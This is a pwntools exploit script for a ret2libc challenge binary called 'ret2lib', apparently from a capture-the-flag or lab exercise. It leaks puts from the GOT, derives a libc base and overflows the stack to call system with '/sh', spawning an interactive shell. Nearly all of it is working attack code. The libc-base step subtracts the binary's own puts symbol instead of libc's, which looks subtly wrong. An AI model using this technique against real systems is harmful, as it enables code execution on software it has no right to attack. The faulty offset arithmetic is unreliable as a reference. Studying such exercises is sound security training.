#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2lib
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('ret2lib')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

libc = ELF('/lib/i386-linux-gnu/libc.so.6')
puts_got = exe.got['puts']

io.sendlineafter(') :', puts_got.__str__())
io.recvuntil(': ')

puts_addr = int(io.recv(10), 16)
libc_base = puts_addr - exe.symbols['puts']

## solution 1: one_gadget : execl("/bin/sh", [esp])
# payload = p32(libc_base + 0x1487fc).rjust(0x38 + 4, b'\x90')

## solution 2
system = libc_base + libc.symbols['system']
sh_str = libc_base + next(libc.search(b'/sh\x00'))

payload = p32(system).rjust(0x38 + 4, b'\x90')
payload += b'pwnitia?'
payload += p32(sh_str)

io.sendlineafter(':', payload)
io.interactive()